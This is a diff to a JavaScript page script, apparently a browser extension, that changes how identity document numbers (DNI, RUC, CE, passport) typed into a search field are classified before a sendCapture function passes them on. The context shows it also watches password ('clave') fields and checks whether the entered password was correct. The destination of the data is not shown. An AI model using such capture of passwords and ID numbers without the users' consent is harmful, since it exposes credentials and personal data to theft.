@@ -1,6 +1,13 @@
 (() => {
 const CONTENT_STATE_KEY = '__shalomRecordarContentState__';
 const DOC_INPUT_ID = 'inputnombre';
+// Desplegable de tipo de documento junto al campo de busqueda. El usuario elige
+// aqui el tipo real (DNI/RUC/CE/PS), asi que manda sobre la longitud: es la
+// fuente fiable. Antes se clasificaba solo por la cantidad de digitos, lo que
+// descartaba el pasaporte (PS, que admite letras) y confundia longitudes
+// (un CE de 8 digitos se guardaba como DNI).
+const TIPODOC_SELECT_ID = 'tipodoclist';
+const DOC_TYPES = ['DNI', 'RUC', 'CE', 'PS'];
 const OS_INPUT_ID = 'inputnroguia';
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
 // Senales de que la clave fue CORRECTA: el servidor solo inyecta estos
@@ -167,8 +174,33 @@ function sendCapture(field, value, source, eventTimeStamp) {
     }
 }
 
+// Tipo elegido en el desplegable, o '' si no existe / no es uno conocido.
+function getSelectedDocType() {
+    const select = typeof document.getElementById === 'function' ? document.getElementById(TIPODOC_SELECT_ID) : null;
+    const raw = select && typeof select.value === 'string' ? select.value.trim().toUpperCase() : '';
+    return DOC_TYPES.includes(raw) ? raw : '';
+}
+
+// Clasifica segun el tipo elegido en el desplegable (manda sobre la longitud).
+// El pasaporte (PS) admite alfanumerico; el resto exige solo digitos, pero sin
+// imponer una longitud concreta: el usuario ya declaro el tipo.
+function classifyByDocType(docType, rawValue) {
+    if (docType === 'PS') {
+        const value = normalizeText(rawValue).toUpperCase().replace(/\s+/g, '');
+        return value ? { field: 'PS', value } : null;
+    }
+    const value = normalizeDigits(rawValue);
+    if (!/^\d+$/.test(value)) return null;
+    return { field: docType, value };
+}
+
 function captureDocument(target, source, eventTimeStamp) {
-    const classified = classifyDocumentValue(getFieldValue(target));
+    const docType = getSelectedDocType();
+    // El desplegable es la fuente fiable; la clasificacion por longitud queda de
+    // respaldo cuando el desplegable no esta disponible (p. ej. en las pruebas).
+    const classified = docType
+        ? classifyByDocType(docType, getFieldValue(target))
+        : classifyDocumentValue(getFieldValue(target));
     if (!classified) return;
     sendCapture(classified.field, classified.value, source, eventTimeStamp);
 }
